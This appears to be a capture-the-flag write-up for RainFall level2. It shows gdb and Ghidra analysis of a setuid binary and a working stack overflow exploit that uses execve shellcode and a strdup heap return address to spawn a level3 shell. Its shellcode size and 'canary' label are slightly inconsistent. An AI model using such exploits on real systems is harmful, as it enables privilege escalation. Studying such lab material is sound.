First let's look at the type of the file

```console
level2@RainFall:~$ file level2 
level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
```

with buffer overflow pattern generator we see that the offset is at `80` 

explication il faut trouver le nombre de byte pour overwrite EIP car il pointe sur la return adresse de p()  
En envoyant 80 on overwrite EBP mais pas EIP
```console
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0xb7ea912f in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) info registers
ebp            0x41414141	0x41414141
eip            0xb7ea912f	0xb7ea912f
```

EIP se trouve toujours a EBP + 4 car il pointe sur la return adresse, donc si on relance le meme proceder avec 84 A
```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level2/level2 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
ebp            0x41414141	0x41414141
eip            0x41414141	0x41414141
```

41 etant l'hexa pour le A majuscule

---------------------------------------------------------------------------------

### How to get system("/bin/sh") in the libc

```console
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
--> \x60\xb0\xe6\xb7

(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
--> \xe0\xeb\xe5\xb7


(gdb) x/500s $esp
0xbffff915:	 "SHELL=/bin/bash"
0xbffff915 + 6 = 0xbffff91b
--> \x1b\xf9\xff\xbf
```

```
payload = A*76 + ????? x 4 + address of system() + return address for system() + address of "/bin/sh"
```

----------------------------------------------------------------------------------------



## Solution

Let's reverse the xecutable using gidra
```c
void p(void)

{
  uint unaff_retaddr;
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
                    // WARNING: Subroutine does not return
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}

void main(void)

{
  p();
  return;
}
```

We see that the program is protected by a canary: ` if ((unaff_retaddr & 0xb0000000) == 0xb0000000)`  
If the return address is in the stack (`0xb`), the program will exit

But we see that a copy of our buffer is made here: `strdup(local_50);`

What to do ??

We shall look at the allocated address on the heap of strdup with gdb in `eax` register

```
Address allocated by strdup (size 4)
0x0804a008 --> \x08\xa0\x04\x08
```

We shall use the buffer `char local_50 [76];` to stock our shellcode and then fill it trash (`'A'` characters) and then put the return address of the allocated copy done by strdup on the heap (`\x08\xa0\x04\x08`)

The canary will not caught our buffer overflow because the address is not on the stack (`0xb`)

```
Here is our shellcode (size 24)
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

```bash
(python -c 'print("\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 56 + "\x08\xa0\x04\x08")'; cat) | ./level2
```

```console
level2@RainFall:~$ (python -c 'print("\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 56 + "\x08\xa0\x04\x08")'; cat) | ./level2

1��Ph//shh/bin��PS��
                    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
```
